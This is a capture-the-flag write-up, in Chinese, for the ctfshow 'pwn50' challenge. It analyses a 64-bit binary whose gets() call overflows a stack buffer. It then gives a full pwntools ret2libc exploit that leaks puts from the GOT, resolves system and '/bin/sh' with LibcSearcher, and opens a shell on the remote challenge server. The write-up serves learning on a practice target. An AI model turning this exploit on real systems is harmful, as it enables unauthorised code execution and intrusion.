```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn50
```

```
tasike@tasike-VM:~/Desktop$ file pwn50
pwn50: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d097803e21010d4894bdad8855a4810d86362ebb, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn50
[*] '/home/tasike/Desktop/pwn50'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`64bit`，堆栈不可执行

`ida`查看

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  logo();
  ctfshow();
  exit(0);
}
```

跟进`ctfshow`

```c
__int64 ctfshow()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Hello CTFshow");
  return gets(v1);
}
```

> `v1`与`rbp`距离`0x20`

查看`pop|ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn50 --only "pop|ret" | grep pop
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

查看`ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn50 --only "pop|ret" | grep ret
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400d74 : ret 0xfff9
0x0000000000400642 : ret 1
```

因此`ret`为：

```
0x00000000004004fe : ret
```

没有`system`和`/bin/sh`

由于还是`动态链接`，因此考虑`ret2libc`



编写`attack50.py`

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28194)

elf = ELF('./pwn50')
poprdi = 0x4007e3
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = cyclic(0x20 + 0x8) + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)
r.sendline(payload)
puts = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
ret = 0x4004fe
payload = cyclic(0x20 + 0x8) + p64(poprdi) + p64(binsh) + p64(ret) + p64(system) 
r.sendline(payload)
r.interactive()
```

